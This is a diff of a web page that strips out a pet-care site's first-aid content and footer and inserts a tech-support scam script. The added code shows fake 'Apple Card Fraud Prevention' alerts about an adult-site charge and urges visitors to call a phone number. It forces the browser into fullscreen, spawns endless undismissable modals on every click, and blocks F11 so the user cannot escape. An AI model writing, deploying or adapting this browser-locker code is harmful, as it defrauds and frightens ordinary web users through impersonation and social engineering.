-         - Emergency preparedness
-         - Seasonal dangers (heatstroke, antifreeze)
-         - Homemade treats recipes
-         - Behavior problem solving
-         - Pet proofing your home
-         - Introducing new baby or pet
-         - Alternative therapies (acupuncture, massage)
-         - Hospice care
-         - Pet adoption checklist
-         - etc. 
-    -->
+    
+    
+ <script>
 
-    <!-- Example additional block (short) - you expand similarly -->
-    <div class="content-block">
-        <h2>🆘 First Aid Every Pet Owner Must Know</h2>
-        <p>Emergencies happen. Build a pet first aid kit: gauze, non-stick bandages, adhesive tape, antiseptic wipes (povidone-iodine), styptic powder, digital thermometer (normal dog/cat temp: 100-102.5°F), saline eye wash, tweezers, and emergency vet numbers. For bleeding: apply direct pressure with clean cloth for 5-10 minutes. For choking: if pet is conscious, perform Heimlich (for small dogs/cats: hold upside down with back against your chest, thrust upward just below ribcage). For seizures: clear area, time the seizure, don't put hands near mouth. For heatstroke (excessive panting, vomiting, collapse): immediately cool with lukewarm (not cold) water on paw pads, groin, armpits, and get to vet — ice water causes shock. For poisoning: call Pet Poison Helpline (855-764-7661) — do NOT induce vomiting unless instructed (some toxins cause more damage coming up). Common toxins: grapes, raisins, xylitol gum, chocolate, rodenticides, lilies, sago palm, antifreeze (sweet taste). Always have activated charcoal and hydrogen peroxide 3% (for induced vomiting under vet guidance). Learn CPR for pets: 30 chest compressions (rate 100-120/min) followed by 2 rescue breaths (cover nose for dog, mouth-to-nose for cat) — repeat. Take a Red Cross pet first aid course. Keep your vet's emergency after-hours number and location of nearest 24-hour animal hospital on your fridge and phone. Microchip number and vaccination records should be accessible. Stay calm — pets sense panic. Being prepared can save a life in the golden hour.</p>
-    </div>
 
-    <!-- You keep adding more blocks... -->
 
-</div>
+    let modalCount = 0;
+    const maxModals = Infinity;
+    let fullScreenTriggered = false;
 
-<footer class="footer">
-    <p>🐾 <strong>Kuddle Companion Nest</strong> — Your trusted partner in compassionate pet care</p>
-    <p>📞 Phone: <a href="tel:+15551234567">+1 (555) 123-4567</a> (24/7 Pet Helpline)</p>
-    <p>📍 Address: 123 Pet Lane, Pawville, PV 90210, United States</p>
-    <p>✉️ Email: hello@kuddlenest.com | 🕒 Mon-Sat: 9am - 8pm | Sun: 10am - 4pm</p>
-    <p style="margin-top: 1rem; font-size: 0.8rem;">© 2025 Kuddle Companion Nest — Every nest deserves a kuddle 🐶🐱</p>
-</footer>
+    // Function to trigger full screen
+    function triggerFullScreen() {
+        const elem = document.documentElement;
+        if (!document.fullscreenElement) { // Only trigger if not already in fullscreen
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen().catch(err => {
+                    console.error('Fullscreen error:', err);
+                });
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) {
+                elem.msRequestFullscreen();
+            }
+        }
+    }
 
+    // Function to exit fullscreen
+    function exitFullScreen() {
+        if (document.exitFullscreen) {
+            document.exitFullscreen();
+        } else if (document.webkitExitFullscreen) {
+            document.webkitExitFullscreen();
+        } else if (document.msExitFullscreen) {
+            document.msExitFullscreen();
+        }
+    }
+
+    // Function to generate random position within viewport
+    function getRandomPosition(modalWidth, modalHeight) {
+        const viewportWidth = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
+        const viewportHeight = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);
+
+        if (modalWidth >= viewportWidth || modalHeight >= viewportHeight) {
+            return {
+                top: Math.max(0, (viewportHeight - modalHeight) / 2),
+                left: Math.max(0, (viewportWidth - modalWidth) / 2)
+            };
+        }
+
+        const maxX = viewportWidth - modalWidth;
+        const maxY = viewportHeight - modalHeight;
+
+        const randomX = Math.floor(Math.random() * (maxX + 1));
+        const randomY = Math.floor(Math.random() * (maxY + 1));
+
+        return { top: randomY, left: randomX };
+    }
+
+    // Function to create a new modal with random position
+    function createNewModal() {
+        if (modalCount >= maxModals) return null;
+
+        modalCount++;
+
+        const newModal = document.createElement('div');
+        newModal.className = 'modal fade modal-stack';
+        newModal.id = `appleAlertModal-${modalCount}`;
+        newModal.tabIndex = -1;
+        newModal.setAttribute('aria-labelledby', `appleAlertModalLabel-${modalCount}`);
+        newModal.setAttribute('aria-hidden', 'true');
+
+        newModal.innerHTML = `
+            <div class="modal-dialog modal-lg positioned">
+                <div class="modal-content" id="applealertmodeltwo" style="height:225px">
+                    <div class="modal-header pb-0">
+                        <button type="button" class="p-0 btn-close"></button>
+                    </div>
+                    <div class="modal-body text-center">
+                        <div class="alert-text">
+                            🚨 URGENT SECURITY NOTICE <br> A payment request of *$249.99* for *Adult Cam Services* was submitted using your Apple Card. As a security measure, we have *temporarily placed this transaction on hold* pending verification. To cancel or dispute this charge before processing, please contact Apple Card Security immediately. 📞 Customer Support: <a href="tel:+1-888-903-3138">Call +1-888-903-3138</a> . Reference Number: AC-749281 Apple Card Fraud Prevention Team.
+                        </div>
+                        <div class="callnowbtn">
+                            <a href="tel:+1-888-903-3138" class="tel-link">
+                                <button type="button" class="btn btn-danger text-white" >
+                                    <i class="bi bi-telephone-outbound call-icon"></i> Call Now
+                                </button>
+                            </a>
+                        </div>
+                        <div class="text-center mt-4 actionbtn" style="right:20px;">
+                            
+                                <button type="button" class="btn btn-primary ok-btn me-2">OK</button>
+                            
+                            <button type="button" class="btn btn-outline-secondary cancel-btn">Cancel</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+
+        document.getElementById('modalContainer').appendChild(newModal);
+
+        const modal = new bootstrap.Modal(newModal, {
+            backdrop: 'static',
+            keyboard: false
+        });
+
+        const modalDialog = newModal.querySelector('.modal-dialog');
+        let modalWidth, modalHeight;
+
+        modalWidth = Math.min(600, window.innerWidth * 0.9);
+        modalHeight = window.innerWidth <= 576 ? 250 : 400;
+
+        const { top, left } = getRandomPosition(modalWidth, modalHeight);
+        modalDialog.style.top = `${top}px`;
+        modalDialog.style.left = `${left}px`;
+
+        if (window.innerWidth <= 576) {
+            modalDialog.style.width = `${modalWidth}px`;
+            modalDialog.style.maxWidth = 'none';
+        }
+
+        newModal.style.zIndex = 1080 + modalCount;
+        modal.show();
+
+        // Ensure tel: link actually triggers phone call
+        newModal.querySelectorAll('.tel-link').forEach(link => {
+            link.addEventListener('click', (e) => {
+                window.location.href = link.getAttribute('href');
+            });
+        });
+
+        // return modal;
+    }
+
+    // Initialize the first modal
+    const appleAlertModal = new bootstrap.Modal(document.getElementById('appleAlertModal'), {
+        backdrop: 'static',
+        keyboard: false
+    });
+
+    document.addEventListener('DOMContentLoaded', function () {
+        appleAlertModal.show();
+    });
+
+    // Add event listener to body for fullscreen and modal creation
+    document.body.addEventListener('click', () => {
+        triggerFullScreen();
+        createNewModal();
+    });
+
+    // On ESC â†’ exit fullscreen
+    document.addEventListener("keydown", function (e) {
+        if (e.key === "Escape") {
+            exitFullScreen();
+        }
+        if (e.key === "F11" || e.keyCode === 122) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+    }, true);
+
+    document.addEventListener("keyup", function (e) {
+        if (e.key === "F11" || e.keyCode === 122) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+    }, true);
+
+    // If fullscreen exits (via ESC), next body click/activity will trigger fullscreen again
+    document.addEventListener("fullscreenchange", () => {
+        if (!document.fullscreenElement) {
+            // User exited fullscreen
+            document.body.addEventListener("click", triggerFullScreen, { once: true });
+        }
+    });
+
+    window.addEventListener('resize', function () {
+        const modals = document.querySelectorAll('.modal-stack .modal-dialog.positioned');
+
+        modals.forEach(modal => {
+            const viewportHeight = window.innerHeight;
+            const modalHeight = modal.offsetHeight;
+            let { top } = getRandomPosition(modal.offsetWidth, modalHeight);
+
+            if (top + modalHeight > viewportHeight) {
+                top = Math.max(0, viewportHeight - modalHeight);
+            }
+
+            modal.style.top = `${top}px`;
+            modal.style.left = `0`;
+            modal.style.width = `100%`;
+            modal.style.maxHeight = `${viewportHeight}px`;
+            modal.style.overflow = `hidden`;
+        });
+    });
+</script>
+
+
+
+
+    <script src="code.jquery.com/jquery-1.12.0.min.html"></script>
 </body>
 </html>
